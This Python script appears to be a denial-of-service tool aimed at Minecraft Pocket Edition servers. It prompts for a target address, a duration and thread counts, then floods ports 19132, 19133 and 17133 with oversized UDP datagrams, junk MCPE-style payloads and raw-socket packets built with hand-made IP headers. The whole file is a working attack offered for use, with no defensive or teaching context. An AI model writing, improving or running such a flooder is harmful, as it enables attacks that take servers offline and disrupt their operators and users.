import os
import random
import sys
import socket
import threading
import time
import struct
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
import select
import multiprocessing

os.system('clear' if os.name == 'posix' else 'cls')

MCPE_HANDSHAKE = b'\x00\xff\x00\xfe\xfd\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb'
MCPE_LOGIN = b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
MCPE_PING = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

def is_valid_ipv4(ip):
    try:
        ipaddress.IPv4Address(ip)
        return True
    except ipaddress.AddressValueError:
        return False

def mcpe_flood(ip, port):
    payloads = [
        MCPE_HANDSHAKE + b'A' * 1400 + os.urandom(1000),
        MCPE_LOGIN + b'B' * 1400 + os.urandom(1000),
        MCPE_PING + b'C' * 1400 + os.urandom(1000),
        os.urandom(2048),
        b'\xfe' * 2048,
        struct.pack('!I', random.randint(0, 0xFFFFFFFF)) * 512,
    ]
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(0.0001)
    
    while True:
        try:
            for payload in payloads:
                for _ in range(50):
                    sock.sendto(payload, (ip, port))
                    sock.sendto(payload, (ip, 19132))
                    sock.sendto(payload, (ip, 19133))
        except:
            pass

def udp_amplifier(ip, port):
    amp_payloads = [
        b'\x00\x01\x00\x00' + os.urandom(65507),
        b'\xff\xff\xff\xff' + struct.pack('!IIII', random.randint(1,10000), 0, 0, 0) * 4000,
        b'\x17\x00\x00\x00' + os.urandom(65507),
    ]
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while True:
        payload = random.choice(amp_payloads)
        for _ in range(200):
            sock.sendto(payload, (ip, port))

def raw_flood(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        while True:
            ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 0x4000, 0, 0x40, 17, 0, 0, b'\x00'*4, socket.inet_aton(ip))
            udp_header = struct.pack('!HHHH', random.randint(123, 65535), port, 8, 0)
            data = os.urandom(65000)
            packet = ip_header + udp_header + data
            sock.sendto(packet, (ip, 0))
    except:
        pass

def multi_target_worker(ips_ports):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    while True:
        payload = os.urandom(random.choice([1024, 2048, 4096, 65535]))
        for ip, port in ips_ports:
            try:
                sock.sendto(payload, (ip, port))
            except:
                pass

def main():
    print("")
    print("\033[1;31m█░█░█▀▄░█▀█      ▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█\033[0m")
    print("\033[1;31m█▄█░█▄█░█▀▀░ ▀▀▀ ░█░ █▄█ ▀▀█ ▄█ ░█░ ██▄ █▀▄\033[0m")
    print("")
    
    target = input("\033[1;31m[#]\033[0m \033[1;37mEnter MCPE server IP/domain:\033[0m ")
    if not is_valid_ipv4(target):
        ip = socket.gethostbyname(target)
        print(f"\033[1;31m[+]\033[0m Resolved to \033[1;38;2;255;100;100m{ip}\033[0m")
    else:
        ip = target
    
    duration = int(input("\033[1;31m[#]\033[0m \033[1;37mDuration (seconds):\033[0m "))
    mcpe_threads = int(input("\033[1;31m[#]\033[0m \033[1;37mMCPE threads:\033[0m "))
    udp_threads = int(input("\033[1;31m[#]\033[0m \033[1;37mUDP amplifier threads:\033[0m "))
    raw_threads = int(input("\033[1;31m[#]\033[0m \033[1;37mRaw socket threads:\033[0m "))
    
    print(f"\033[1;32m[*]\033[0m Launching MCPE+UDP+RAW flood on \033[1;38;2;255;100;100m{ip}\033[0m")
    
    targets = [(ip, 19132), (ip, 19133), (ip, 17133)]
    
    with ThreadPoolExecutor(max_workers=1024) as executor:
        futures = []
        
        for _ in range(mcpe_threads):
            futures.append(executor.submit(mcpe_flood, ip, 19132))
        
        for _ in range(udp_threads):
            futures.append(executor.submit(udp_amplifier, ip, 19132))
        
        for _ in range(raw_threads):
            futures.append(executor.submit(raw_flood, ip, 19132))
        
        for _ in range(200):
            futures.append(executor.submit(multi_target_worker, targets))
    
    time.sleep(duration)
    print("\033[1;31m[!]\033[0m \033[1;37mFlood completed.\033[0m")
    sys.exit(0)

if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()